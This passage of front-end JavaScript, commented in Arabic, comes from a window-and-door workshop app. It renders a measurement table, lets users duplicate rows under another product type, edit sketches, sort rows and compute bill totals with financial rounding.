      const item=jobList[idx];if(!item||!wsIsDoorRow(item))return;
      if(isSheetLocked()||isSheetIdleLocked()||!canEditItem(item))return;
      const old=String(item.doorBottomOption||'');
      const overlay=document.createElement('div');overlay.className='tp-overlay';
      overlay.innerHTML='<div class="tp-box" role="dialog" style="max-width:390px"><h3>ملاحظة الباب</h3><div style="display:grid;gap:12px;text-align:right"><label><input type="radio" name="wsBottom" value="مشفر من أسفل"> مشفر من أسفل</label><label><input type="radio" name="wsBottom" value="بدون تشفير"> بدون تشفير</label><label><input type="radio" name="wsBottom" value="مشفر من أعلى"> مشفر من أعلى</label></div><div class="tp-actions"><button type="button" class="tp-btn ws-bottom-save">حفظ</button><button type="button" class="tp-btn ws-bottom-cancel">إلغاء</button></div></div>';
      document.body.append(overlay);
      const radio=Array.from(overlay.querySelectorAll('input[name="wsBottom"]'));
      (radio.find(r=>r.value===old)||radio[1]).checked=true;
      overlay.querySelector('.ws-bottom-cancel').onclick=()=>overlay.remove();
      overlay.querySelector('.ws-bottom-save').onclick=()=>{
        const val=radio.find(r=>r.checked)?.value||'بدون تشفير';
        item.doorBottomOption=val;
        const clean=String(item.note||'').split('\n').filter(line=>!['مشفر من أسفل','بدون تشفير','مشفر من أعلى'].includes(line.trim()));
        clean.push(val);item.note=clean.join('\n').trim();
        item.editedAt=Date.now();saveCurrentState();renderTable();overlay.remove();
      };
    }
    function openRowDrawing(idx) {
      if (isSheetLocked()) {
        showMiniToast('🔒 الكراسة محفوظة. اضغط «تعديل وإضافة مقاسات» تحت الجدول أولاً.', '#16477f');
        return;
      }
      const item = jobList[idx];
      if (!item) return;
      if (!canEditItem(item)) {
        alert(lockMessage(item));
        return;
      }
      drawingEditIndex = idx;
      const box = document.getElementById('mediaBox');
      if (box) box.style.display = 'block';
      const src = safeImgSrc(item.img);
      // إذا لم يكن للصف رسم، افتح لوحة بيضاء حتى يمكن إنشاء الرسم من الصفر.
      if (!src) {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        isCanvasEmpty = true;
        resetCanvasUndo();
        openBigCanvas();
        return;
      }
      const img = new Image();
      img.onload = () => {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        ctx.drawImage(img,0,0,canvas.width,canvas.height);
        resetCanvasUndo();
        isCanvasEmpty=false;
        openBigCanvas();
      };
      img.onerror = () => {
        drawingEditIndex = -1;
        showMiniToast('تعذر فتح الرسم الحالي.', '#c0392b');
      };
      img.src = src;
    }

    function openRowTypePicker(idx) {
      const item = jobList[idx];
      if (!item) return;
      closeTypePicker();
      // 9.9.11: النسخ يرى كل الأنواع الفعلية: الأساسية + المحلية + القادمة من Firestore،
      // بما فيها الإضافات التي كانت تُستبعد سابقاً بسبب !d.extra. لا نُنشئ أسماء بديلة.
      const seenTypeIds = new Set();
      const seenTypeNames = new Set();
      const defs = getAllTypeDefs().filter(d => {
        if(!d || !d.id || d.id === item.type || seenTypeIds.has(d.id)) return false;
        if(d.id === 'seranati' || d.legacy) return false;
        if(d.extra && !d.asType && !isProtectedType(d.id)) return false;
        const displayName = String(d.originalName || d.name || getTypeName(d.id));
        const displayNorm = normName(displayName);
        if(displayNorm === normName('سرانتي')) return false;
        if(seenTypeNames.has(displayNorm)) return false;
        seenTypeIds.add(d.id);
        seenTypeNames.add(displayNorm);
        return true;
      }).map(d => ({
        id:d.id,
        name:String(d.originalName || d.name || getTypeName(d.id)),
        color:d.color || '#147d49',
        icon:d.icon || 'fa-shapes',
        extra:!!d.extra
      }));
      const ov = document.createElement('div');
      ov.id = 'typePickerOverlay'; ov.className = 'tp-overlay'; ov.dataset.rowDuplicateIdx = String(idx);
      ov.onclick = e => { if (e.target === ov) closeTypePicker(); };
      ov.innerHTML = '<div class="tp-box" role="dialog" aria-label="اختر النوع الجديد">' +
        '<div class="tp-head"><div class="tp-title">تكرار المقاس بنوع آخر</div><div class="tp-dim">' + escHtml(item.w) + ' × ' + escHtml(item.h) + '</div></div>' +
        '<div class="tp-hint">نفس قائمة الأنواع بالأعلى — ضع ✓ على النوع الذي تريد إنشاء المقاس به.</div>' +
        '<div class="tp-list">' + defs.map(d => '<label class="tp-item" style="border-right:4px solid '+safeColor(d.color)+';"><input type="checkbox" class="tp-cb" value="'+escHtml(d.id)+'"><i class="fas '+safeCls(d.icon)+'" style="color:'+safeColor(d.color)+';"></i><span>'+escHtml(d.name)+'</span></label>').join('') +
        '<button type="button" class="tp-item tp-new" onclick="addTypeFromRowPicker()"><i class="fas fa-plus"></i><span>نوع جديد…</span></button></div>' +
        '<div class="tp-actions"><button type="button" class="tp-btn tp-cancel" onclick="closeTypePicker()">إلغاء</button><button type="button" class="tp-btn tp-ok" onclick="confirmRowTypePicker()">إضافة النوع</button></div></div>';
      document.body.appendChild(ov);
    }

    function addTypeFromRowPicker() {
      const ov = document.getElementById('typePickerOverlay'); if (!ov) return;
      const idx = Number(ov.dataset.rowDuplicateIdx);
      const picked = Array.from(ov.querySelectorAll('.tp-cb:checked')).map(c => c.value);
      const before = getCustomTypes().map(t => t.id);
      let addedId = null;
      try { addedId = addCustomType({fromRowPicker:true}); } catch(e) { console.error(e); return; }
      const added = addedId ? getCustomTypes().find(t => t.id === addedId) : getCustomTypes().find(t => before.indexOf(t.id) === -1);
      openRowTypePicker(idx);
      const n = document.getElementById('typePickerOverlay');
      if (n && added) n.querySelectorAll('.tp-cb').forEach(cb => { cb.checked = picked.concat([added.id]).indexOf(cb.value) > -1; });
    }

    function confirmRowTypePicker() {
      const ov = document.getElementById('typePickerOverlay'); if (!ov) return;
      const idx = Number(ov.dataset.rowDuplicateIdx);
      const picked = Array.from(ov.querySelectorAll('.tp-cb:checked')).map(c => c.value);
      if (!picked.length) { showMiniToast('ضع ✓ على نوع واحد على الأقل', '#157f4a'); return; }
      const item = jobList[idx]; if (!item) { closeTypePicker(); return; }
      beginPendingSheetChanges('تكرار نوع');
      const alreadyPresent = new Set(jobList.map(x => String(x.type) + '|' + String(x.w) + '|' + String(x.h)));
      picked.forEach((typeId, n) => {
        if (typeId === item.type) return;

        /* 9.9.12 — نسخ «سرانتي عادي» من داخل الجدول يجب أن يمر عبر نفس
           قاعدة الإضافة الموجودة بالأعلى، لا أن يكون مجرد تغيير type.

           القاعدة الموحدة موجودة في buildExtraRow()/extraDim():
           عند إضافة السرانتي العادي مع فتحة أساسية (PVC أو ألمونيوم)
           يزاد العرض 1 سم والارتفاع 15 سم. أما إذا كان المقاس المقاس
           نفسه للسرانتي فلا نضيف الزيادة مرة ثانية.

           مثال:
             PVC 90×90 → سرانتي عادي = 91×105
             سرانتي عادي 91×105 → نسخة سرانتي عادي أخرى = نفس المقاس

           بهذه الطريقة لا توجد قاعدة ثانية مختلفة داخل الجدول. */
        let copyW = item.w;
        let copyH = item.h;
        let copyNote = item.note || '';
        const target = getAllTypeDefs().find(d => d && d.id === typeId);
        const targetExtra = getExtraTypes().find(t => t && t.id === typeId);
        const targetIsSerNormal = typeId === SER_NORMAL_ID;

        if (targetIsSerNormal) {
          // نفس معنى withBase في الإضافة العلوية: المصدر الأساسي PVC أو ألمونيوم.
          const sourceIsBase = item.type === 'pvc' || item.type === 'xtype_pvc_slide' || item.type === ALUM_ID;
          if (sourceIsBase && targetExtra) {
            const d = extraDim(targetExtra, item.w, item.h);
            copyW = d.w;
            copyH = d.h;
            if (d.changed) {
              const auto = 'مقاس السرانتي محسوب من ' + item.w + '×' + item.h;
              if (!String(copyNote).includes(auto)) copyNote = [copyNote, auto].filter(Boolean).join(' — ');
            }
          }
        }

        const copy = Object.assign({}, item, {
          type:typeId,
          w:copyW,
          h:copyH,
          note:copyNote,
          res:calculateLogic(copyW, copyH, typeId),
          addedAt:Date.now()+n,
          addedBy:(window.currentShopUser&&window.currentShopUser.name)||item.addedBy||'',
          sel:true,
          ord:jobList.length+n
        });
        // هوية النوع تُحفظ داخل المقاس نفسه حتى لا يعتمد عرض الاسم على وصول تعريفه أولاً من الشبكة.
        Object.assign(copy, typeSnapshotFor(typeId));
        const copyKey = String(copy.type) + '|' + String(copy.w) + '|' + String(copy.h);
        if (alreadyPresent.has(copyKey)) return;
        alreadyPresent.add(copyKey);
        jobList.push(copy);
      });
      pendingEditRowIndex = idx;
      closeTypePicker(); renderTable(); updateMainActionLabel();
      showMiniToast('✓ تم تكرار '+item.w+' × '+item.h+' بالنوع المحدد — اضغط «حفظ التعديل» أسفل الصف', '#147d49');
    }

    function duplicateRowAsAnotherType(idx) {
      if (isSheetLocked()) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }
      if (isSheetIdleLocked()) { alert(idleLockMessage()); return; }
      if (!jobList[idx]) return;
      openRowTypePicker(idx);
    }

    function installMeasurementRowLongPress(row, idx) {
      let timer=null, fired=false;
      const start=(ev)=>{ if(ev && ev.target && /^(INPUT|BUTTON|SELECT|TEXTAREA|IMG)$/.test(ev.target.tagName)) return; fired=false; timer=setTimeout(()=>{fired=true; row.classList.add('long-pressing'); try{navigator.vibrate&&navigator.vibrate(35)}catch(e){} duplicateRowAsAnotherType(idx); setTimeout(()=>row.classList.remove('long-pressing'),250); },650); };
      const cancel=()=>{ if(timer){clearTimeout(timer);timer=null;} row.classList.remove('long-pressing'); };
      row.addEventListener('pointerdown', start, {passive:true});
      row.addEventListener('pointerup', cancel); row.addEventListener('pointercancel', cancel); row.addEventListener('pointerleave', cancel);
    }

    function renderTable() {
      const preferredView=window.WSEngine?.preferences(currentUserUid()).view;if(['classic','diagram','sheet'].includes(preferredView))measurementViewMode=preferredView;
      ensureOrderIndices();
      /* 9.7.0 — شريط يشرح سبب تعذّر الإضافة قبل أن يحاول المستخدم.
         القفل الذي لا يُعلن عن نفسه يُقرأ عطلاً: يضغط «إضافة للجدول»
         فلا يقع شيء، فيظنّ النظام معطوباً. */
      try {
        let bar = document.getElementById('idleLockBar');
        const locked = isSheetIdleLocked();
        if (locked && !bar) {
          bar = document.createElement('div');
          bar.id = 'idleLockBar';
          bar.style.cssText = 'margin:8px 0; padding:10px 12px; border-radius:12px; font-size:12px;' +
            'font-weight:800; background:#fdf4e3; color:#8a5a12; border:1px solid #f0d9a8; text-align:center;';
          const tbl = document.getElementById('mainTable');
          if (tbl && tbl.parentNode) tbl.parentNode.insertBefore(bar, tbl);
        }
        if (bar) {
          bar.style.display = locked ? 'block' : 'none';
          if (locked) {
            bar.innerHTML = '🔒 اكتمل رفع مقاسات هذه الكراسة — لا إضافة عليها.' +
              (isManagerUser() ? '' : '<br>ابدأ كراسة جديدة بزرّ «جديد».');
            if (isManagerUser()) {
              const btn = document.createElement('button');
              btn.textContent = '🔓 فتحها للإضافة';
              btn.style.cssText = 'margin-top:7px; padding:6px 12px; border:none; border-radius:9px;' +
                'background:#16477f; color:#fff; font-weight:800; font-size:11px; font-family:inherit;';
              btn.onclick = unlockIdleSheet;
              bar.appendChild(document.createElement('br'));
              bar.appendChild(btn);
            }
          }
        }
      } catch (e) {}
      const viewTable = document.getElementById('mainTable');
      if (viewTable) { viewTable.classList.toggle('diagram-view', measurementViewMode === 'diagram'); viewTable.classList.toggle('sheet-view', measurementViewMode === 'sheet'); }
      const classicViewBtn = document.getElementById('measurementViewClassicBtn');
      const diagramViewBtn = document.getElementById('measurementViewDiagramBtn');
      const sheetViewBtn = document.getElementById('measurementViewSheetBtn');
      if (classicViewBtn) { classicViewBtn.setAttribute('aria-pressed', String(measurementViewMode === 'classic')); classicViewBtn.style.outline = measurementViewMode === 'classic' ? '2px solid #397fe5' : 'none'; }
      if (diagramViewBtn) { diagramViewBtn.setAttribute('aria-pressed', String(measurementViewMode === 'diagram')); diagramViewBtn.style.outline = measurementViewMode === 'diagram' ? '2px solid #397fe5' : 'none'; }
      if (sheetViewBtn) { sheetViewBtn.setAttribute('aria-pressed', String(measurementViewMode === 'sheet')); sheetViewBtn.style.outline = measurementViewMode === 'sheet' ? '2px solid #397fe5' : 'none'; }
      let tbody = document.querySelector('#mainTable tbody'); tbody.innerHTML = '';
      const typeNumbers = computeTypeNumbers(jobList);
      const mgr = isManagerUser();
      lockStateKey = jobList.map(i => (canEditItem(i) ? '1' : '0') + (canDeleteItem(i) ? '1' : '0')).join('');
      jobList.forEach((i, idx) => {
        normalizeRowTypeIdentity(i);
        let r = tbody.insertRow();
        r.className = i.type + '-row';
        const canEdit = canEditItem(i) && !isSheetLocked();
        // الحذف مهلته أقصر (نصف ساعة)، فقد يبقى التعديل متاحاً والحذف مقفولاً
        const canDel  = canDeleteItem(i) && !isSheetLocked();
        const left = (!mgr && canEdit) ? editLeftLabel(i) : '';
        r.classList.add('measure-row');
        r.innerHTML = `
          <td class="no-print"><input type="checkbox" data-measurement-index="${idx}" ${i.sel?'checked':''} onchange="event.stopPropagation();jobList[${idx}].sel=this.checked;calcSum();syncSelectionTargetBill(true);saveCurrentState()"></td>
          <td style="text-align:center; font-weight:bold; color:var(--muted); font-family:'JetBrains Mono',monospace;">${typeNumbers[idx]}</td>
          <td onclick="event.stopPropagation();openRowMediaChoices(${idx})" title="تعديل الرسم أو الرمز">${safeImgSrc(i.img)?`<img class="draw-thumb" src="${safeImgSrc(i.img)}" style="width:46px;height:38px;object-fit:contain;border-radius:7px;">`:i.cuttingSymbol?window.WSOpeningSymbols.html(i,60):i.cuttingFormula?wsFormulaImageHtml(i.cuttingFormula,i.formulaLabel,i.openingDirection):wsSymbolUrl(i.openingSymbol)?`<img class="draw-thumb" src="${wsSymbolUrl(i.openingSymbol)}" alt="${escHtml(i.formulaLabel||'رمز الفتحة')}" style="width:46px;height:38px;object-fit:contain;">`:'<span style="font-size:11px;color:#94a3b8;cursor:pointer">رسم</span>'}</td>
          <td class="direct-cell" style="text-align:right; min-width:178px; width:178px; white-space:nowrap;">
            <div class="cell-type"><span translate="no" class="${safeCls(i.type)}-badge">${escHtml(getTypeName(i.type))}</span></div>
            ${i.formulaLabel?`<small style="display:block;color:#147f8a">${escHtml(i.formulaLabel)}</small>`:''}
            ${measurementDiagramMarkup(i.w, i.h, i.type)}
            <div class="dimension-editor" style="display:flex;gap:4px;align-items:center;justify-content:flex-start;direction:rtl">
              <input class="direct-input" value="${escHtml(i.w)}" aria-label="العرض" title="تعديل العرض مباشرة" ${canEdit?'':'readonly'} onchange="event.stopPropagation();directRowEdit(${idx},'w',this)">
              <span>×</span>
              <input class="direct-input" value="${escHtml(i.h)}" aria-label="الارتفاع" title="تعديل الارتفاع مباشرة" ${canEdit?'':'readonly'} onchange="event.stopPropagation();directRowEdit(${idx},'h',this)">
            </div>
            ${i.sk?`<small>(${escHtml(i.sk)})</small>`:''} ${i.itemColor?`<small>(${escHtml(i.itemColor)})</small>`:''}
            <button class="no-print" type="button" onclick="event.stopPropagation();wsExecutionDetails(${idx})">التقسيم والتنفيذ</button>
            ${measurementNoteMarkup(i.note)}
            ${canEdit&&wsIsDoorRow(i)?`<button class="no-print" type="button" onclick="event.stopPropagation();wsSetDoorBottomNote(${idx})">ملاحظة تشفير الباب</button>`:''}
            ${canEdit?`<details class="ws-note-editor no-print" ontoggle="if(this.open)autoGrowNote(this.querySelector('textarea'))"><summary>${i.note?'تعديل الملاحظة':'إضافة ملاحظة'}</summary><textarea class="direct-input direct-note" rows="3" style="white-space:pre-wrap;min-height:78px;resize:vertical;line-height:1.65" placeholder="ملاحظة متعددة الأسطر..." aria-label="ملاحظة" oninput="syncMeasurementNote(this)" onchange="event.stopPropagation();directRowEdit(${idx},'note',this)">${escHtml(i.note||'')}</textarea></details>`:''}
          </td>
          <td style="font-weight:bold; min-width:96px; white-space:nowrap;" class="cell-size">
            <input type="text" lang="en" inputmode="decimal" value="${escHtml(i.res)}" class="numeric-input${canEdit ? '' : ' res-locked'}" ${canEdit ? '' : 'readonly'} style="width:92px; min-width:92px; box-sizing:border-box; text-align:center; padding:6px 4px; font-size:13px; border:1.5px solid var(--border); border-radius:8px;" onchange="updateRowResult(${idx}, this)">
          </td>
          <td class="no-print">
            ${canEdit
              ? `<button onclick="event.stopPropagation();editRow(${idx})" style="color:blue; background:none; border:none;" title="تعديل المقاس"><i class="fas fa-edit"></i></button>
            <button onclick="event.stopPropagation();duplicateRowAsAnotherType(${idx})" style="color:#147d49; background:none; border:none;" title="إضافة هذا المقاس بنوع آخر"><i class="fas fa-copy"></i></button>
            ${canDel
              ? `<button onclick="deleteRow(${idx})" style="color:red; background:none; border:none;" title="حذف"><i class="fas fa-trash"></i></button>`
              : `<button onclick="alert(deleteLockMessage(jobList[${idx}]))" style="color:#d1d4d3; background:none; border:none;" title="انتهت مهلة الحذف — راجع المدير"><i class="fas fa-trash"></i></button>`}
            <span class="row-move">
              <button onclick="event.stopPropagation(); moveRow(${idx}, -1)" title="تحريك لأعلى"${idx === 0 ? ' disabled' : ''}><i class="fas fa-chevron-up"></i></button>
              <button onclick="event.stopPropagation(); moveRow(${idx}, 1)" title="تحريك لأسفل"${idx === jobList.length - 1 ? ' disabled' : ''}><i class="fas fa-chevron-down"></i></button>
            </span>
            ${left ? `<div class="edit-left" title="المتبقي من مهلة التعديل">⏳ ${left}</div>` : ''}`
              : `<button class="row-lock" onclick="${isSheetLocked() ? "showMiniToast('🔒 للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f')" : `explainLock(${idx})`}" title="${isSheetLocked() ? 'كراسة محفوظة — التعديل من الزر أسفل الجدول فقط' : (isOwnItem(i) ? 'انتهت مهلة الساعتين' : 'مقاس أضافه عضو آخر') + ' — راجع المدير'}"><i class="fas fa-lock"></i></button>`}
          </td>`;
        const noteBox = r.querySelector('.direct-note');
        if (noteBox) autoGrowNote(noteBox);
        installMeasurementRowLongPress(r, idx);
      });
      calcSum();
      try { renderSheetCredit(); } catch(e) { console.error('renderSheetCredit:', e); }
      // أزرار نسخ الإضافات السريعة تظهر/تختفي حسب وجود مقاسات من نوعها في الجدول
      try { renderCopyButtons(); } catch(e) { console.error('renderCopyButtons:', e); }
    }

    /* سطر «أدخلها: فلان» تحت الجدول.
       يُبنى من حقل addedBy المختوم على كل مقاس، فيُظهر كل من شارك في
       الكراسة لا المستخدم الحالي — وهذا هو المقصود: من رفع هذه القياسات. */
    function autoGrowNote(el) {
      if (!el) return;
      el.style.height = 'auto';
      el.style.height = Math.max(38, el.scrollHeight) + 'px';
    }

    function renderSheetCredit() {
      const el = document.getElementById('sheetCredit');
      if (!el) return;
      if (!Array.isArray(jobList) || jobList.length === 0) { el.style.display = 'none'; el.textContent = ''; return; }

      // أسماء المُدخِلين بترتيب أول ظهور، بلا تكرار
      const names = [];
      jobList.forEach(i => {
        const n = (i.addedBy || '').trim();
        if (n && names.indexOf(n) === -1) names.push(n);
      });
      if (!names.length) { el.style.display = 'none'; el.textContent = ''; return; }

      // أحدث وقت إدخال، ليُعرف متى أُخذت المقاسات
      const times = jobList.map(i => i.addedAt || 0).filter(Boolean);
      let when = '';
      if (times.length) {
        const d = new Date(Math.max.apply(null, times));
        when = ' · ' + d.toLocaleDateString('ar-EG') + ' ' +
               d.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
      }
      const label = names.length === 1 ? 'أدخل القياسات: ' : 'أدخل القياسات: ';
      el.textContent = '✍️ ' + label + names.join(' ، ') + when;
      el.style.display = '';
    }

    /* يعيد رسم الجدول تلقائياً لحظة انتهاء مهلة أي صف أثناء فتح الصفحة،
       فتتحوّل أزرار التعديل/الحذف إلى قفل في وقتها دون إعادة تحميل الصفحة */
    setInterval(() => {
      if(isManagerUser() || editingIndex > -1 || jobList.length === 0) return;
      const nowKey = jobList.map(i => (canEditItem(i) ? '1' : '0') + (canDeleteItem(i) ? '1' : '0')).join('');
      if(nowKey !== lockStateKey) renderTable();
    }, 30000);

    // تجميع عناصر الجدول بحيث توضع كل عناصر نفس النوع تحت بعضها (بيفيسي معاً، سرانتي معاً... إلخ)
    function groupTableByType() {
      if (isSheetLocked()) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }   // كراسة محفوظة: لا كتابة قبل فتحها صراحةً
      if (isSheetIdleLocked()) { alert(idleLockMessage()); return; }   // 9.7.0 — قفل بعد اكتمال الرفع
      if(editingIndex > -1) { alert('⚠️ يرجى إنهاء تعديل العنصر الحالي أولاً'); return; }
      if(jobList.length === 0) return;
      ensureOrderIndices();
      const rank = {};
      getAllTypeDefs().forEach((d, i) => rank[d.id] = i);
      jobList.sort((a, b) => {
        const ra = rank[a.type] !== undefined ? rank[a.type] : 999;
        const rb = rank[b.type] !== undefined ? rank[b.type] : 999;
        return ra !== rb ? ra - rb : a.ord - b.ord;
      });
      renderTable();
      saveCurrentState();
    }

    // ترتيب جدول العناصر حسب اللون أبجدياً (العناصر بلا لون تبقى في الأسفل)
    function sortByColor() {
      if(editingIndex > -1) { alert('⚠️ يرجى إنهاء تعديل العنصر الحالي أولاً'); return; }
      if(jobList.length === 0) return;
      ensureOrderIndices();
      jobList.sort((a, b) => {
        const ca = (a.itemColor || '').trim(), cb = (b.itemColor || '').trim();
        if(!ca && !cb) return a.ord - b.ord;
        if(!ca) return 1;
        if(!cb) return -1;
        return ca.localeCompare(cb, 'ar') || a.ord - b.ord;
      });
      renderTable();
      saveCurrentState();
    }

    // إعادة ترتيب الجدول لترتيب الإضافة الأصلي قبل أي تجميع
    function restoreOriginalOrder() {
      if(editingIndex > -1) { alert('⚠️ يرجى إنهاء تعديل العنصر الحالي أولاً'); return; }
      if(jobList.length === 0) return;
      ensureOrderIndices();
      jobList.sort((a, b) => a.ord - b.ord);
      renderTable();
      saveCurrentState();
    }

    function editRow(idx) {
      editOpenedAt = Date.now();
      if (isSheetLocked()) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }
      if (isSheetIdleLocked()) { alert(idleLockMessage()); return; }
      let item = jobList[idx];
      if(!canEditItem(item)) { alert(lockMessage(item)); renderTable(); return; }
      const d = getAllTypeDefs().find(x => x.id === item.type);
      if(!d) {
        // النوع الأصلي لهذا الصف لم يعد ضمن الأقسام الحالية (مثلاً تم حذفه) - لا نفتح معاملة مؤجلة غير قابلة للحفظ.
        alert('⚠️ نوع هذا العنصر لم يعد موجوداً ضمن الأقسام الحالية. يمكنك حذف الصف أو تعديل الناتج مباشرة من الجدول.');
        editingIndex = -1;
        return;
      }
      editingIndex = idx;
      pendingEditRowIndex = idx;
      drawingEditIndex = idx;
      switchBox(item.type);
      const wi = document.getElementById(d.w), hi = document.getElementById(d.h);
      if(wi) wi.value = item.w;
      if(hi) hi.value = item.h;
      if(resolveTypeId(item.type) === SER_NORMAL_ID) { const ski = document.getElementById('sk'); if(ski) ski.value = item.sk || ''; }
      if(item.type === 'pvc') document.getElementById('pcolor').value = item.itemColor || '';
      document.getElementById('note').value = item.note;
      installEditAutoSaveListeners();
      if(item.img) {
        document.getElementById('mediaBox').style.display = 'block';
        let img = new Image(); img.onload = () => { ctx.drawImage(img, 0, 0, canvas.width, canvas.height); resetCanvasUndo(); };
        /* إصلاح 8.8.5 — المصدر من measurementJobs التي يكتبها أي عضو.
           رابط خارجي هنا يعمل منارةَ تتبّع (من فتح أي مقاس ومتى) ويلوّث
           اللوحة فيفشل حفظ الرسم بعدها. نقصره على الصور المضمّنة. */
        img.src = /^data:image\/(png|jpe?g|gif|webp);/i.test(String(item.img)) ? item.img : '';
        isCanvasEmpty = false;
      }
      updateMainActionLabel();
      document.getElementById('editHint').style.display = 'block';
      renderTable();
      const row = document.querySelector('#mainTable tbody tr:nth-child(' + (idx + 1) + ')');
      if (row) row.scrollIntoView({behavior:'smooth', block:'center'});
    }

    function clearInputs(clearMedia = true) {
      drawingEditIndex = -1;
      document.querySelectorAll('#inputSection input').forEach(i=>i.value='');
      document.getElementById('note').value='';
      if(clearMedia) {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        isCanvasEmpty=true;
        resetCanvasUndo();
        document.getElementById('mediaBox').style.display = 'none';
      }
    }

    function renderSelectedSummary() {
      // لا نعرض قائمة المقاسات المحددة. علامات ✓ في الجدول هي مصدر الحساب
      // الوحيد، ومجموعها يذهب مباشرةً إلى كمية البند المالي المستهدف.
      const box = document.getElementById('selectedSummaryBox');
      if (box) box.style.display = 'none';
    }

    function calcSum() {
      const defs = getAllTypeDefs();
      let totals = {};
      defs.forEach(d => totals[d.id] = 0);
      jobList.forEach(i => {
        if(i.sel) {
          if(!(i.type in totals)) totals[i.type] = 0;
          totals[i.type] += wsNum(i.res);   // إصلاح 8.8
        }
      });
      /* إجمالي كل نوع على حدة فقط — بلا مجموع عام ولا إجمالي صفحة.
         الأنواع المختلفة لا تُجمع: كل نوع له سعره وحسابه المستقل، وجمعها
         في رقم واحد يُنتج قيمة لا معنى لها في أي فاتورة. */
      renderSelectedSummary();
      const parts = defs.filter(d => totals[d.id] > 0)
        .map(d => `إجمالي ${escHtml(getTypeName(d.id))}: ${totals[d.id].toFixed(2)} م²`);
      document.getElementById('jobSummary').innerHTML = parts.join(' | ');
      syncAutoBillRows(totals, defs);
      syncSelectionTargetBill();
      updateCuttingBtnLabel();
      calcBill();
    }

    /* التقريب المالي — نفس دالة صفحة الفواتير حرفياً.
       الخلل الذي تعالجه: الكراسة كانت تستخدم toFixed(2) وحدها، والفواتير
       تستخدم تقريباً بمعامل تصحيح للأخطاء العشرية. فينتج رقمان مختلفان
       لنفس البند: 7 × 2.675 تعطي 18.72 في الكراسة و18.73 في الفاتورة.
       يراه الزبون في صورة المقاسات ثم يراه مختلفاً في فاتورته. */
    function money2(v) {
      v = +toLatinDigitsM(v);
      if (Number.isNaN(v) || !isFinite(v)) return 0;
      const eps = v >= 0 ? 1e-9 : -1e-9;
      return Math.round((v + eps) * 100) / 100;
    }
    /* إصلاح 8.8: غلاف على المصدر الموحّد في shared.js — وأُضيف فيه حذف
       محارف الاتجاه غير المرئية التي تأتي مع اللصق من واتساب، وكانت
       تُبقي «١٠٠» الملصوقة NaN حتى بعد تحويل الأرقام. */
    function toLatinDigitsM(v) {
      if (typeof v !== 'string') return v;
      return (typeof wsToLatinDigits === 'function') ? wsToLatinDigits(v) : v;
    }

    /* ══ المبلغ الإجمالي القابل للتعديل ══
       المجموع محسوب من البنود (كمية × سعر). ويُتاح تعديله يدوياً لأن
       صاحب العمل كثيراً ما يجبر الكسر أو يخفّض المبلغ لزبون.

       ولا يُخزَّن المبلغ المعدَّل رقماً مستقلاً — يُخزَّن **الفارق**:
         • أقل من المحسوب → خصم، يُمرَّر للفاتورة في حقل discount.
         • أكثر منه       → بند «تسوية» يُضاف للبنود.
       فتظل معادلة الفاتورة صحيحة دائماً: الإجمالي = البنود − الخصم.
       ولو خُزِّن رقماً مستقلاً لانفصل عن البنود، فيتغيّر بند ويبقى المجموع
       على حاله — والزبون يجمع البنود بنفسه فيجد رقماً آخر. */
    let sheetTotalOverride = null;   // المبلغ الذي حدّده المستخدم يدوياً
    // أنواع البنود المالية التلقائية التي حذفها المستخدم صراحةً.
    // الحذف هنا نهائي لهذه الكراسة ولا يُعاد إنشاء البند عند تغيّر المقاسات.
    let suppressedAutoBillTypes = new Set();

    function computedBillTotal() {
      let total = 0;
      document.querySelectorAll('.bill-row').forEach(row => {
        const q = money2(row.querySelector('.b-q').value);
        const p = money2(row.querySelector('.b-p').value);
        total = money2(total + money2(q * p));
      });
      return total;
    }

    function calcBill() {
      let total = 0;
      document.querySelectorAll('.bill-row').forEach(row => {
        let q = money2(row.querySelector('.b-q').value);
        let p = money2(row.querySelector('.b-p').value);
        let sub = money2(q * p);
        row.querySelector('.b-total').innerText = sub.toFixed(2);
        total = money2(total + sub);
      });

      const note = document.getElementById('totalOverrideNote');
      const shown = (sheetTotalOverride !== null) ? sheetTotalOverride : total;
      document.getElementById('grandTotal').innerText = shown.toFixed(2);

      if (note) {
        if (sheetTotalOverride === null) { note.style.display = 'none'; note.textContent = ''; }
        else {
          const diff = money2(total - sheetTotalOverride);
          note.style.display = '';
          note.innerHTML = 'المحسوب من البنود: <b>' + total.toFixed(2) + '</b> د.ل — ' +
            (diff > 0 ? ('خصم <b>' + diff.toFixed(2) + '</b>')
             : diff < 0 ? ('زيادة <b>' + (-diff).toFixed(2) + '</b>')
             : 'بلا فارق') +
            ' · <a href="#" onclick="event.preventDefault();clearSheetTotal();" style="color:#14693e;">إلغاء التعديل</a>';
        }
      }
    }

    function editSheetTotal() {
      if (isSheetLocked()) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }
      if (sheetApproval) {
        alert('⛔ الخدمة معتمدة — لا يُعدَّل مبلغها من هنا.\n\nعدّلها من تطبيق الفواتير، أو ألغِ الاعتماد أولاً.');
        return;
      }
      const base = computedBillTotal();
      if (base <= 0) { alert('أضف بنداً مالياً واحداً على الأقل قبل تعديل المجموع.'); return; }

      const cur = (sheetTotalOverride !== null) ? sheetTotalOverride : base;
      const ans = prompt('المبلغ الإجمالي المطلوب من الزبون\n\n' +
                         'المحسوب من البنود: ' + base.toFixed(2) + ' د.ل\n' +
                         'اكتب المبلغ النهائي (اتركه فارغاً للعودة للمحسوب):', cur.toFixed(2));
      if (ans === null) return;
      const clean = String(ans).trim();
      if (!clean) { clearSheetTotal(); return; }

      const val = money2(toLatinNums(clean));
      if (isNaN(val) || val < 0) { alert('⚠️ اكتب رقماً صحيحاً غير سالب.'); return; }

      sheetTotalOverride = (money2(val) === base) ? null : money2(val);
      calcBill();
      saveCurrentState();
      if (sheetTotalOverride !== null) {
        const d = money2(base - sheetTotalOverride);
